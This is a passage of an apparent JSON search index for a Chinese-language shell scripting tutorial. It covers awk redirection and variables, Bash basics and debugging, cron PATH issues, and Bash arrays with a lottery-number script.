BEGIN{ FS=\":\" printf \"\u8bf7\u8f93\u5165\u4e00\u4e2a\u7528\u6237\u540d\uff1a \" getline username < \"/dev/pts/10\" } { if($1==username) \u5224\u65ad { print NR,$1 } } [root@shell shelldoc]# awk -f sc2.awk /etc/passwd \u8bf7\u8f93\u5165\u4e00\u4e2a\u7528\u6237\u540d\uff1a root 1 root","title":"\u8f93\u5165\u91cd\u5b9a\u5411"},{"location":"programming_language/awk/awk_redirect/#2awk","text":"[root@shell shelldoc]# awk -F: '$3 > 100{print $1,$3 | \"sort -nr -k2\"}' /etc/passwd","title":"2\u3001awk\u4e0e\u7ba1\u9053"},{"location":"programming_language/awk/awk_redirect/#3awk","text":"[root@shell shelldoc]# awk 'BEGIN{print \"today is \";system(\"date\")}' today is Mon Sep 7 12:26:03 CST 2015","title":"3\u3001\u4f7f\u7528awk\u6267\u884c\u7cfb\u7edf\u547d\u4ee4"},{"location":"programming_language/awk/awk_var/","text":"awk\u4f7f\u7528\u53d8\u91cf \u5982\u679c\u7b2c\u56db\u5217\u5339\u914d :\u52a0\u53d8\u91cf\uff0c\u5c31\u6253\u5370 netstat -tan4p | awk '{if($4~/:'''$a'''$/){print $0}}' awk\u4e2d\u4f7f\u7528bash\u4e2d\u7684\u53d8\u91cf \u4e00 \u7528\u7279\u6b8a\u7b26\u53f7 \"'$var'\" \u8fd9\u79cd\u5199\u6cd5\u5927\u5bb6\u65e0\u9700\u6539\u53d8\u7528 ' \u62ec\u8d77awk\u7a0b\u5e8f\u7684\u4e60\u60ef,\u662f\u8001\u5916\u5e38\u7528\u7684\u5199\u6cd5.\u5982: var=\"test\" awk 'BEGIN{print \"'$var'\"}' \u5982\u679cvar\u4e2d\u542b\u7a7a\u683c,\u4e3a\u4e86shell\u4e0d\u628a\u7a7a\u683c\u4f5c\u4e3a\u5206\u683c\u7b26,\u4fbf\u5e94\u8be5\u5982\u4e0b\u4f7f\u7528: var=\"this is a test\" awk 'BEGIN{print \"'\"$var\"'\"}' \u4e8c \u4f7f\u7528\u73af\u5883\u53d8\u91cf export \u53d8\u91cf,\u4f7f\u7528ENVIRON[\"var\"]\u5f62\u5f0f,\u83b7\u53d6\u73af\u5883\u53d8\u91cf\u7684\u503c \u4f8b\u5982: var=\"this is a test\"; export var; awk 'BEGIN{print ENVIRON[\"var\"]}' \u4e09 awk\u7684-v \u53ef\u4ee5\u4f7f\u7528awk\u7684-v\u9009\u9879 \uff08\u5982\u679c\u53d8\u91cf\u4e2a\u6570\u4e0d\u591a\uff0c\u4e2a\u4eba\u504f\u5411\u4e8e\u8fd9\u79cd\u5199\u6cd5\uff09 \u4f8b\u5982: var=\"this is a test\" awk -v awk_var=\"$var\" 'BEGIN {print awk_var}' \u8fd9\u6837\u4fbf\u628a\u7cfb\u7edf\u53d8\u91cfvar\u4f20\u9012\u7ed9\u4e86awk\u53d8\u91cfawk_var. awk\u5411bash\u53d8\u91cf\u4f20\u9012\u503c \u7531awk\u5411shell\u4f20\u9012\u53d8\u91cf\uff0c\u5176\u601d\u60f3\u65e0\u975e\u662f\u7528awk(sed/perl\u7b49\u4e5f\u662f\u4e00\u6837)\u8f93\u51fa\u82e5\u5e72\u6761shell\u547d\u4ee4\uff0c\u7136\u540e\u518d\u7528shell\u53bb\u6267\u884c\u8fd9\u4e9b\u547d\u4ee4\u3002 eval $(awk 'BEGIN{print \"var1='str1';var2='str2'\"}') \u6216\u8005 eval $(awk '{printf(\"var1=%s; var2=%s; var3=%s;\",$1,$2,$3)}' abc.txt) \u4e4b\u540e\u53ef\u4ee5\u5728\u5f53\u524dshell\u4e2d\u4f7f\u7528var1,var2\u7b49\u53d8\u91cf\u4e86\u3002 echo \"var1=$var1 ----- var2=$var2\" \u6307\u5b9a\u884c\u53f7 \u53c2\u8003\u8d44\u6599\uff1a http://developer.51cto.com/art/200509/3781.htm http://www.ixpub.net/thread-1457438-1-1.html https://blog.csdn.net/xiaolang85/article/details/79884535","title":"awk\u4f7f\u7528bash\u53d8\u91cf"},{"location":"programming_language/awk/awk_var/#awk","text":"\u5982\u679c\u7b2c\u56db\u5217\u5339\u914d :\u52a0\u53d8\u91cf\uff0c\u5c31\u6253\u5370 netstat -tan4p | awk '{if($4~/:'''$a'''$/){print $0}}'","title":"awk\u4f7f\u7528\u53d8\u91cf"},{"location":"programming_language/awk/awk_var/#awkbash","text":"","title":"awk\u4e2d\u4f7f\u7528bash\u4e2d\u7684\u53d8\u91cf"},{"location":"programming_language/awk/awk_var/#_1","text":"\"'$var'\" \u8fd9\u79cd\u5199\u6cd5\u5927\u5bb6\u65e0\u9700\u6539\u53d8\u7528 ' \u62ec\u8d77awk\u7a0b\u5e8f\u7684\u4e60\u60ef,\u662f\u8001\u5916\u5e38\u7528\u7684\u5199\u6cd5.\u5982: var=\"test\" awk 'BEGIN{print \"'$var'\"}' \u5982\u679cvar\u4e2d\u542b\u7a7a\u683c,\u4e3a\u4e86shell\u4e0d\u628a\u7a7a\u683c\u4f5c\u4e3a\u5206\u683c\u7b26,\u4fbf\u5e94\u8be5\u5982\u4e0b\u4f7f\u7528: var=\"this is a test\" awk 'BEGIN{print \"'\"$var\"'\"}'","title":"\u4e00 \u7528\u7279\u6b8a\u7b26\u53f7"},{"location":"programming_language/awk/awk_var/#_2","text":"export \u53d8\u91cf,\u4f7f\u7528ENVIRON[\"var\"]\u5f62\u5f0f,\u83b7\u53d6\u73af\u5883\u53d8\u91cf\u7684\u503c \u4f8b\u5982: var=\"this is a test\"; export var; awk 'BEGIN{print ENVIRON[\"var\"]}'","title":"\u4e8c \u4f7f\u7528\u73af\u5883\u53d8\u91cf"},{"location":"programming_language/awk/awk_var/#awk-v","text":"\u53ef\u4ee5\u4f7f\u7528awk\u7684-v\u9009\u9879 \uff08\u5982\u679c\u53d8\u91cf\u4e2a\u6570\u4e0d\u591a\uff0c\u4e2a\u4eba\u504f\u5411\u4e8e\u8fd9\u79cd\u5199\u6cd5\uff09 \u4f8b\u5982: var=\"this is a test\" awk -v awk_var=\"$var\" 'BEGIN {print awk_var}' \u8fd9\u6837\u4fbf\u628a\u7cfb\u7edf\u53d8\u91cfvar\u4f20\u9012\u7ed9\u4e86awk\u53d8\u91cfawk_var.","title":"\u4e09 awk\u7684-v"},{"location":"programming_language/awk/awk_var/#awkbash_1","text":"\u7531awk\u5411shell\u4f20\u9012\u53d8\u91cf\uff0c\u5176\u601d\u60f3\u65e0\u975e\u662f\u7528awk(sed/perl\u7b49\u4e5f\u662f\u4e00\u6837)\u8f93\u51fa\u82e5\u5e72\u6761shell\u547d\u4ee4\uff0c\u7136\u540e\u518d\u7528shell\u53bb\u6267\u884c\u8fd9\u4e9b\u547d\u4ee4\u3002 eval $(awk 'BEGIN{print \"var1='str1';var2='str2'\"}') \u6216\u8005 eval $(awk '{printf(\"var1=%s; var2=%s; var3=%s;\",$1,$2,$3)}' abc.txt) \u4e4b\u540e\u53ef\u4ee5\u5728\u5f53\u524dshell\u4e2d\u4f7f\u7528var1,var2\u7b49\u53d8\u91cf\u4e86\u3002 echo \"var1=$var1 ----- var2=$var2\" \u6307\u5b9a\u884c\u53f7 \u53c2\u8003\u8d44\u6599\uff1a http://developer.51cto.com/art/200509/3781.htm http://www.ixpub.net/thread-1457438-1-1.html https://blog.csdn.net/xiaolang85/article/details/79884535","title":"awk\u5411bash\u53d8\u91cf\u4f20\u9012\u503c"},{"location":"programming_language/bash/","text":"Bash \u4ecb\u7ecd Bash \uff0c Unix shell \u7684\u4e00\u79cd\uff0c\u57281987\u5e74\u7531 \u5e03\u83b1\u6069\u00b7\u798f\u514b\u65af \u4e3a\u4e86 GNU\u8ba1\u5212 \u800c\u7f16\u5199\u30021989\u5e74\u53d1\u5e03\u7b2c\u4e00\u4e2a\u6b63\u5f0f\u7248\u672c\uff0c\u539f\u5148\u662f\u8ba1\u5212\u7528\u5728 GNU \u64cd\u4f5c\u7cfb\u7edf\u4e0a\uff0c\u4f46\u80fd\u8fd0\u884c\u4e8e\u5927\u591a\u6570 \u7c7bUnix\u7cfb\u7edf \u7684\u64cd\u4f5c\u7cfb\u7edf\u4e4b\u4e0a\uff0c\u5305\u62ec Linux \u4e0e Mac OS X v10.4 \u8d77\u81f3 macOS Mojave \u90fd\u5c06\u5b83\u4f5c\u4e3a\u9ed8\u8ba4shell\uff0c\u800c\u81ea macOS Catalina \uff0c\u9ed8\u8ba4Shell\u4ee5 zsh \u53d6\u4ee3\u3002 Bash\u662f Bourne shell \u7684\u540e\u7ee7\u517c\u5bb9\u7248\u672c\u4e0e\u5f00\u653e\u6e90\u4ee3\u7801\u7248\u672c\uff0c\u5b83\u7684\u540d\u79f0\u6765\u81ea Bourne shell \uff08sh\uff09\u7684\u4e00\u4e2a\u53cc\u5173\u8bed\uff08 Bourne again / born again\uff09\uff1a B ourne- A gain SH ell\u3002 Bash\u662f\u4e00\u4e2a\u547d\u4ee4\u5904\u7406\u5668\uff0c\u901a\u5e38\u8fd0\u884c\u4e8e\u6587\u672c\u7a97\u53e3\u4e2d\uff0c\u5e76\u80fd\u6267\u884c\u7528\u6237\u76f4\u63a5\u8f93\u5165\u7684\u547d\u4ee4\u3002Bash\u8fd8\u80fd\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u547d\u4ee4\uff0c\u8fd9\u6837\u7684\u6587\u4ef6\u79f0\u4e3a\u811a\u672c\u3002\u548c\u5176\u4ed6Unix shell \u4e00\u6837\uff0c\u5b83\u652f\u6301\u6587\u4ef6\u540d\u66ff\u6362\uff08\u901a\u914d\u7b26\u5339\u914d\uff09\u3001 \u7ba1\u9053 \u3001 here\u6587\u6863 \u3001\u547d\u4ee4\u66ff\u6362\u3001\u53d8\u91cf\uff0c\u4ee5\u53ca\u6761\u4ef6\u5224\u65ad\u548c\u5faa\u73af\u904d\u5386\u7684\u7ed3\u6784\u63a7\u5236\u8bed\u53e5\u3002\u5305\u62ec\u5173\u952e\u5b57\u3001\u8bed\u6cd5\u5728\u5185\u7684\u57fa\u672c\u7279\u6027\u5168\u90e8\u662f\u4ece sh \u501f\u9274\u8fc7\u6765\u7684\u3002\u5176\u4ed6\u7279\u6027\uff0c\u4f8b\u5982\u5386\u53f2\u547d\u4ee4\uff0c\u662f\u4ece csh \u548c ksh \u501f\u9274\u800c\u6765\u3002\u603b\u7684\u6765\u8bf4\uff0cBash\u867d\u7136\u662f\u4e00\u4e2a\u6ee1\u8db3 POSIX \u89c4\u8303\u7684shell\uff0c\u4f46\u6709\u5f88\u591a\u6269\u5c55\u3002 \u4f7f\u7528bash\u811a\u672c\u7684\u539f\u56e0 \u529f\u80fd\u6bd4\u8f83\u5f3a\u5927\uff0c\u53ef\u4ee5\u79fb\u690d \u8282\u7701\u65f6\u95f4\uff0c\u63d0\u9ad8\u5de5\u4f5c\u6548\u7387\uff0c\u53ef\u4ee5\u91cd\u590d\u6267\u884c\u547d\u4ee4 Bash\u811a\u672c\u7684\u597d\u5904 \u51cf\u5c11\u91cd\u590d\u6027\u5de5\u4f5c\uff0c\u63d0\u5347\u6548\u7387 \u7ec4\u6210bash\u811a\u672c\u7684\u5143\u7d20 \u5373bash\u811a\u672c\u57fa\u672c\u683c\u5f0f #!/bin/bash \u2014\u2014 sha-bang\uff0c\u4e5f\u79f0\u4e3a\u5e7b\u6570\uff0c\u7528\u6765\u6307\u660e\u811a\u672c\u4e2d\u7684\u547d\u4ee4\u662f\u7531\u4ec0\u4e48\u73af\u5883\u6765\u89e3\u6790\u7684 \u4e00\u884c\u5230\u591a\u884c\u7684\u6ce8\u91ca\u884c \u4ee5#\u5f00\u5934\u7684\uff0c\u6ce8\u91ca\u91cc\u9762\u5199\uff1a\u4f5c\u8005\u3001\u7f16\u5199\u65f6\u95f4\u3001\u66f4\u65b0\u65f6\u95f4\u3001\u811a\u672c\u7684\u529f\u80fd\u7b49 [\u53d8\u91cf] \u2014\u2014 \u53d8\u91cf\u7684\u5b9a\u4e49\uff0c\u53ef\u4ee5\u7528\u5230\u7684\u65f6\u5019\u5b9a\u4e49\uff0c\u4e5f\u53ef\u4ee5\u4e8b\u5148\u5b9a\u4e49 \u547d\u4ee4\u3001\u6d41\u7a0b\u63a7\u5236\u8bed\u53e5\u7b49 Bash\u811a\u672c\u7684\u8c03\u8bd5 1\uff09\u5bf9\u811a\u672c\u6574\u4f53\u8fdb\u884c\u8c03\u8bd5 \u200b sh -x \u811a\u672c\u7684\u540d\u5b57 // -x\uff1a\u4f1a\u5c06\u811a\u672c\u6267\u884c\u8fc7\u7a0b\u4e2d\u6bcf\u4e00\u884c\u90fd\u6253\u5370\u5230\u6807\u51c6\u8f93\u51fa 2\uff09\u5bf9\u811a\u672c\u7684\u5c40\u90e8\u8c03\u8bd5 \u200b set -x //\u5f00\u542f\u8c03\u8bd5\u529f\u80fd \u200b set +x //\u5173\u95ed\u8c03\u8bd5\u529f\u80fd [root@shell ~]# cd /script/ [root@shell script]# sc1.sh #!/bin/bash for i in $(seq 5) do echo $i done [root@shell script]# sh -x sc1.sh [root@shell script]# sc1.sh #!/bin/bash for i in $(seq 5) do set -x echo $i echo hello $i set +x done [root@shell script]# sh sc1.sh \u811a\u672c\u7684\u8fd0\u884c \u200b 1\uff09\u811a\u672c\u7f16\u5199\u5b8c\u6210\uff0c\u6dfb\u52a0\u6267\u884c\u6743\u9650\uff0c\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\u6216\u8005\u7edd\u5bf9\u8def\u5f84\u7684\u65b9\u5f0f\u8fd0\u884c\u811a\u672c \u200b [root@shell script]# ./sc1.sh \u200b bash: ./sc1.sh: Permission denied \u200b [root@shell script]# chmod +x sc1.sh \u200b [root@shell script]# ./sc1.sh \u200b 2\uff09\u7f16\u5199\u5b8c\u6210\uff0c\u4f7f\u7528sh\u6216\u8005bash\u547d\u4ee4\u8fd0\u884c\u811a\u672c(\u53ef\u4ee5\u6ca1\u6709\u6267\u884c\u6743\u9650) \u200b [root@shell script]# sh sc1.sh //\u6709\u65e0\u6267\u884c\u6743\u9650\u5747\u53ef \u200b 3\uff09\u8ba1\u5212\u4efb\u52a1(\u7cfb\u7edf\u81ea\u52a8\u6267\u884c) \u200b \u6ce8\u610f\uff1a\u811a\u672c\u4e00\u5b9a\u8981\u6709\u6267\u884c\u6743\u9650\uff0c\u800c\u4e14\u5728\u8ba1\u5212\u4efb\u52a1\u4e2d\u4e00\u5b9a\u8981\u5199\u811a\u672c\u7684\u7edd\u5bf9\u8def\u5f84 \u200b [root@shell script]# crontab -e \u200b 0 * * /script/sc1.sh \u60f3\u8981\u4e0d\u8bba\u5f53\u524d\u76ee\u5f55\u5728\u54ea\uff0c\u6211\u90fd\u53ef\u4ee5\u76f4\u63a5\u6572\u811a\u672c\u7684\u540d\u5b57\u5c31\u6267\u884c\u811a\u672c\uff0c\u600e\u4e48\u505a\uff1f \u6539PATH [root@shell scripts]# /root/.bash_profile PATH=$PATH:$HOME/bin:/script //\u4fee\u6539\uff0c\u5c06\u81ea\u5df1\u8def\u5f84\u52a0\u5165 [root@shell scripts]# . /root/.bash_profile [root@shell scripts]# cd [root@shell ~]# sc1.sh \u4e00\u4e2a\u811a\u672c\u5728\u7ec8\u7aef\u53ef\u4ee5\u8fd0\u884c\uff0c\u4f46\u662f\u5728\u8ba1\u5212\u4efb\u52a1\u4e2d\u53ef\u80fd\u4e0d\u80fd\u8fd0\u884c\uff0c\u539f\u56e0\u53ef\u80fd\u662f\u5b50shell\u7684\u95ee\u9898\uff0c\u5728\u7ec8\u7aef\u548c\u5728\u8ba1\u5212\u4efb\u52a1\u4e2d\u8fd0\u884c\u7ee7\u627f\u7684PATH\u503c\u4e0d\u540c\uff0c\u5bfc\u81f4\u811a\u672c\u4e2d\u67d0\u4e9b\u547d\u4ee4\u53ef\u80fd\u4e0d\u80fd\u6267\u884c\u3002 \u89e3\u51b3\u529e\u6cd5\uff1a\u5728\u4f60\u811a\u672c\u4e2d\u6dfb\u52a0\u4e00\u884c export PATH=/usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/root/bin \u6d4b\u8bd5crontab\u4e2d\u7684PATH\u503c [root@shell script]# sc2.sh #!/bin/bash echo $PATH [root@shell script]# chmod +x sc2.sh [root@shell script]# crontab -e * * * * * /script/sc2.sh [root@shell script]# mail /usr/bin:/bin \u91cd\u73b0\u9519\u8bef [root@server scripts]# cat test.sh #!/bin/bash ipaddr=$(ifconfig eth0 | grep Bcast | cut -d: -f2 | cut -d\" \" -f1) echo $ipaddr [root@server scripts]# crontab -e * * * * * /scripts/test.sh [root@server scripts]# ./test.sh 172.16.254.200 [root@server scripts]# mail /scripts/test.sh: line 2: ifconfig: command not found [root@server scripts]# cat test.sh #!/bin/bash export PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin ipaddr=$(ifconfig eth0 | grep Bcast | cut -d: -f2 | cut -d\" \" -f1) echo $ipaddr [root@server scripts]# mail 172.16.254.200 \u200b","title":"Bash \u4ecb\u7ecd"},{"location":"programming_language/bash/#bash","text":"Bash \uff0c Unix shell \u7684\u4e00\u79cd\uff0c\u57281987\u5e74\u7531 \u5e03\u83b1\u6069\u00b7\u798f\u514b\u65af \u4e3a\u4e86 GNU\u8ba1\u5212 \u800c\u7f16\u5199\u30021989\u5e74\u53d1\u5e03\u7b2c\u4e00\u4e2a\u6b63\u5f0f\u7248\u672c\uff0c\u539f\u5148\u662f\u8ba1\u5212\u7528\u5728 GNU \u64cd\u4f5c\u7cfb\u7edf\u4e0a\uff0c\u4f46\u80fd\u8fd0\u884c\u4e8e\u5927\u591a\u6570 \u7c7bUnix\u7cfb\u7edf \u7684\u64cd\u4f5c\u7cfb\u7edf\u4e4b\u4e0a\uff0c\u5305\u62ec Linux \u4e0e Mac OS X v10.4 \u8d77\u81f3 macOS Mojave \u90fd\u5c06\u5b83\u4f5c\u4e3a\u9ed8\u8ba4shell\uff0c\u800c\u81ea macOS Catalina \uff0c\u9ed8\u8ba4Shell\u4ee5 zsh \u53d6\u4ee3\u3002 Bash\u662f Bourne shell \u7684\u540e\u7ee7\u517c\u5bb9\u7248\u672c\u4e0e\u5f00\u653e\u6e90\u4ee3\u7801\u7248\u672c\uff0c\u5b83\u7684\u540d\u79f0\u6765\u81ea Bourne shell \uff08sh\uff09\u7684\u4e00\u4e2a\u53cc\u5173\u8bed\uff08 Bourne again / born again\uff09\uff1a B ourne- A gain SH ell\u3002 Bash\u662f\u4e00\u4e2a\u547d\u4ee4\u5904\u7406\u5668\uff0c\u901a\u5e38\u8fd0\u884c\u4e8e\u6587\u672c\u7a97\u53e3\u4e2d\uff0c\u5e76\u80fd\u6267\u884c\u7528\u6237\u76f4\u63a5\u8f93\u5165\u7684\u547d\u4ee4\u3002Bash\u8fd8\u80fd\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u547d\u4ee4\uff0c\u8fd9\u6837\u7684\u6587\u4ef6\u79f0\u4e3a\u811a\u672c\u3002\u548c\u5176\u4ed6Unix shell \u4e00\u6837\uff0c\u5b83\u652f\u6301\u6587\u4ef6\u540d\u66ff\u6362\uff08\u901a\u914d\u7b26\u5339\u914d\uff09\u3001 \u7ba1\u9053 \u3001 here\u6587\u6863 \u3001\u547d\u4ee4\u66ff\u6362\u3001\u53d8\u91cf\uff0c\u4ee5\u53ca\u6761\u4ef6\u5224\u65ad\u548c\u5faa\u73af\u904d\u5386\u7684\u7ed3\u6784\u63a7\u5236\u8bed\u53e5\u3002\u5305\u62ec\u5173\u952e\u5b57\u3001\u8bed\u6cd5\u5728\u5185\u7684\u57fa\u672c\u7279\u6027\u5168\u90e8\u662f\u4ece sh \u501f\u9274\u8fc7\u6765\u7684\u3002\u5176\u4ed6\u7279\u6027\uff0c\u4f8b\u5982\u5386\u53f2\u547d\u4ee4\uff0c\u662f\u4ece csh \u548c ksh \u501f\u9274\u800c\u6765\u3002\u603b\u7684\u6765\u8bf4\uff0cBash\u867d\u7136\u662f\u4e00\u4e2a\u6ee1\u8db3 POSIX \u89c4\u8303\u7684shell\uff0c\u4f46\u6709\u5f88\u591a\u6269\u5c55\u3002","title":"Bash \u4ecb\u7ecd"},{"location":"programming_language/bash/#bash_1","text":"\u529f\u80fd\u6bd4\u8f83\u5f3a\u5927\uff0c\u53ef\u4ee5\u79fb\u690d \u8282\u7701\u65f6\u95f4\uff0c\u63d0\u9ad8\u5de5\u4f5c\u6548\u7387\uff0c\u53ef\u4ee5\u91cd\u590d\u6267\u884c\u547d\u4ee4","title":"\u4f7f\u7528bash\u811a\u672c\u7684\u539f\u56e0"},{"location":"programming_language/bash/#bash_2","text":"\u51cf\u5c11\u91cd\u590d\u6027\u5de5\u4f5c\uff0c\u63d0\u5347\u6548\u7387","title":"Bash\u811a\u672c\u7684\u597d\u5904"},{"location":"programming_language/bash/#bash-bash","text":"#!/bin/bash \u2014\u2014 sha-bang\uff0c\u4e5f\u79f0\u4e3a\u5e7b\u6570\uff0c\u7528\u6765\u6307\u660e\u811a\u672c\u4e2d\u7684\u547d\u4ee4\u662f\u7531\u4ec0\u4e48\u73af\u5883\u6765\u89e3\u6790\u7684 \u4e00\u884c\u5230\u591a\u884c\u7684\u6ce8\u91ca\u884c \u4ee5#\u5f00\u5934\u7684\uff0c\u6ce8\u91ca\u91cc\u9762\u5199\uff1a\u4f5c\u8005\u3001\u7f16\u5199\u65f6\u95f4\u3001\u66f4\u65b0\u65f6\u95f4\u3001\u811a\u672c\u7684\u529f\u80fd\u7b49 [\u53d8\u91cf] \u2014\u2014 \u53d8\u91cf\u7684\u5b9a\u4e49\uff0c\u53ef\u4ee5\u7528\u5230\u7684\u65f6\u5019\u5b9a\u4e49\uff0c\u4e5f\u53ef\u4ee5\u4e8b\u5148\u5b9a\u4e49 \u547d\u4ee4\u3001\u6d41\u7a0b\u63a7\u5236\u8bed\u53e5\u7b49","title":"\u7ec4\u6210bash\u811a\u672c\u7684\u5143\u7d20   \u5373bash\u811a\u672c\u57fa\u672c\u683c\u5f0f"},{"location":"programming_language/bash/#bash_3","text":"1\uff09\u5bf9\u811a\u672c\u6574\u4f53\u8fdb\u884c\u8c03\u8bd5 \u200b sh -x \u811a\u672c\u7684\u540d\u5b57 // -x\uff1a\u4f1a\u5c06\u811a\u672c\u6267\u884c\u8fc7\u7a0b\u4e2d\u6bcf\u4e00\u884c\u90fd\u6253\u5370\u5230\u6807\u51c6\u8f93\u51fa 2\uff09\u5bf9\u811a\u672c\u7684\u5c40\u90e8\u8c03\u8bd5 \u200b set -x //\u5f00\u542f\u8c03\u8bd5\u529f\u80fd \u200b set +x //\u5173\u95ed\u8c03\u8bd5\u529f\u80fd [root@shell ~]# cd /script/ [root@shell script]# sc1.sh #!/bin/bash for i in $(seq 5) do echo $i done [root@shell script]# sh -x sc1.sh [root@shell script]# sc1.sh #!/bin/bash for i in $(seq 5) do set -x echo $i echo hello $i set +x done [root@shell script]# sh sc1.sh","title":"Bash\u811a\u672c\u7684\u8c03\u8bd5"},{"location":"programming_language/bash/#_1","text":"\u200b 1\uff09\u811a\u672c\u7f16\u5199\u5b8c\u6210\uff0c\u6dfb\u52a0\u6267\u884c\u6743\u9650\uff0c\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\u6216\u8005\u7edd\u5bf9\u8def\u5f84\u7684\u65b9\u5f0f\u8fd0\u884c\u811a\u672c \u200b [root@shell script]# ./sc1.sh \u200b bash: ./sc1.sh: Permission denied \u200b [root@shell script]# chmod +x sc1.sh \u200b [root@shell script]# ./sc1.sh \u200b 2\uff09\u7f16\u5199\u5b8c\u6210\uff0c\u4f7f\u7528sh\u6216\u8005bash\u547d\u4ee4\u8fd0\u884c\u811a\u672c(\u53ef\u4ee5\u6ca1\u6709\u6267\u884c\u6743\u9650) \u200b [root@shell script]# sh sc1.sh //\u6709\u65e0\u6267\u884c\u6743\u9650\u5747\u53ef \u200b 3\uff09\u8ba1\u5212\u4efb\u52a1(\u7cfb\u7edf\u81ea\u52a8\u6267\u884c) \u200b \u6ce8\u610f\uff1a\u811a\u672c\u4e00\u5b9a\u8981\u6709\u6267\u884c\u6743\u9650\uff0c\u800c\u4e14\u5728\u8ba1\u5212\u4efb\u52a1\u4e2d\u4e00\u5b9a\u8981\u5199\u811a\u672c\u7684\u7edd\u5bf9\u8def\u5f84 \u200b [root@shell script]# crontab -e \u200b 0 * * /script/sc1.sh \u60f3\u8981\u4e0d\u8bba\u5f53\u524d\u76ee\u5f55\u5728\u54ea\uff0c\u6211\u90fd\u53ef\u4ee5\u76f4\u63a5\u6572\u811a\u672c\u7684\u540d\u5b57\u5c31\u6267\u884c\u811a\u672c\uff0c\u600e\u4e48\u505a\uff1f \u6539PATH [root@shell scripts]# /root/.bash_profile PATH=$PATH:$HOME/bin:/script //\u4fee\u6539\uff0c\u5c06\u81ea\u5df1\u8def\u5f84\u52a0\u5165 [root@shell scripts]# . /root/.bash_profile [root@shell scripts]# cd [root@shell ~]# sc1.sh \u4e00\u4e2a\u811a\u672c\u5728\u7ec8\u7aef\u53ef\u4ee5\u8fd0\u884c\uff0c\u4f46\u662f\u5728\u8ba1\u5212\u4efb\u52a1\u4e2d\u53ef\u80fd\u4e0d\u80fd\u8fd0\u884c\uff0c\u539f\u56e0\u53ef\u80fd\u662f\u5b50shell\u7684\u95ee\u9898\uff0c\u5728\u7ec8\u7aef\u548c\u5728\u8ba1\u5212\u4efb\u52a1\u4e2d\u8fd0\u884c\u7ee7\u627f\u7684PATH\u503c\u4e0d\u540c\uff0c\u5bfc\u81f4\u811a\u672c\u4e2d\u67d0\u4e9b\u547d\u4ee4\u53ef\u80fd\u4e0d\u80fd\u6267\u884c\u3002 \u89e3\u51b3\u529e\u6cd5\uff1a\u5728\u4f60\u811a\u672c\u4e2d\u6dfb\u52a0\u4e00\u884c export PATH=/usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/root/bin \u6d4b\u8bd5crontab\u4e2d\u7684PATH\u503c [root@shell script]# sc2.sh #!/bin/bash echo $PATH [root@shell script]# chmod +x sc2.sh [root@shell script]# crontab -e * * * * * /script/sc2.sh [root@shell script]# mail /usr/bin:/bin \u91cd\u73b0\u9519\u8bef [root@server scripts]# cat test.sh #!/bin/bash ipaddr=$(ifconfig eth0 | grep Bcast | cut -d: -f2 | cut -d\" \" -f1) echo $ipaddr [root@server scripts]# crontab -e * * * * * /scripts/test.sh [root@server scripts]# ./test.sh 172.16.254.200 [root@server scripts]# mail /scripts/test.sh: line 2: ifconfig: command not found [root@server scripts]# cat test.sh #!/bin/bash export PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin ipaddr=$(ifconfig eth0 | grep Bcast | cut -d: -f2 | cut -d\" \" -f1) echo $ipaddr [root@server scripts]# mail 172.16.254.200 \u200b","title":"\u811a\u672c\u7684\u8fd0\u884c"},{"location":"programming_language/bash/array/","text":"\u6570\u7ec4 \u6570\u7ec4\u662f\u7528\u6570\u7ec4\u7684\u540d\u5b57\u4fdd\u5b58\u4e00\u7ec4\u503c\u7684\u53d8\u91cf \u6570\u7ec4\u4e2d\u7684\u672f\u8bed\uff1a \u6570\u7ec4\u5143\u7d20 \u503c \u200b \u6570\u7ec4\u4e0b\u6807 \u8ddf\u5143\u7d20\u5bf9\u5e94\u7684 1\u3001\u5b9a\u4e49\u6570\u7ec4 declare -a \u6570\u7ec4\u540d=(\u503c) [root@shell script]# name=(tom mary jack) 2\u3001\u67e5\u770b\u6570\u7ec4\u4e2d\u7684\u67d0\u4e2a\u5143\u7d20\u7684\u503c [root@shell script]# echo ${name[1]} //\u4e2d\u62ec\u53f7\u91cc\u9762\u7684\u53eb\u505a\u4e0b\u6807 mary [root@shell script]# echo ${name[0]} tom [root@shell script]# echo ${name[2]} jack 3\u3001\u7ed9\u6570\u7ec4\u4e2d\u7684\u67d0\u4e2a\u5143\u7d20\u8d4b\u503c [root@shell script]# name[1]=rose [root@shell script]# echo ${name[1]} rose 4\u3001\u6570\u7ec4\u7684\u904d\u5386 [root@shell script]# echo ${name[*]} tom rose jack [root@shell script]# echo ${name[@]} 5\u3001\u663e\u793a\u6570\u7ec4\u5143\u7d20\u7684\u4e2a\u6570 [root@shell script]# echo ${#name[*]} 3 [root@shell script]# echo ${#name[@]} 3 6\u3001\u53d6\u6d88\u6570\u7ec4 [root@shell script]# unset name \u4f8b\u5b50\uff1a\u53cc\u8272\u7403 red\uff1a33\u90096 //6\u4e2a\u7ea2\u7403\uff0c\u9700\u8981\u4fdd\u5b58\u5230\u6570\u7ec4\u4e2d blue\uff1a16\u90091 [root@shell script]# echo $RANDOM //\u6253\u5370\u968f\u673a\u6570 12712 \u7ea2\u7403\uff1a [root@shell script]# echo $[$RANDOM%33+1] \u84dd\u7403\uff1a [root@shell script]# echo $[$RANDOM%16+1] \u6700\u7b80\u5355\u7684\u5f69\u7968\uff0c\u4f46\u662f\u7ea2\u7403\u53ef\u80fd\u4f1a\u91cd\u590d [root@shell script]# lottery.sh #!/bin/bash for i in `seq 6` do red[$i]=$[$RANDOM%33+1] echo -n \"${red[$i]} \" done echo echo \"$[$RANDOM%16+1]\" \u200b \u5f69\u8272\u8f93\u51fa\uff1a #!/bin/bash for i in `seq 6` do red[$i]=$[$RANDOM%33+1] echo -n -e \"\\e[1;31m ${red[$i]} \\e[0m\" done echo echo -e \"\\e[1;34m $[$RANDOM%16+1]\\e[0m\" \u989c\u8272\u8bbe\u5b9a\u4ee3\u7801\uff1a \u524d\u666f\u8272\uff1a \u200b 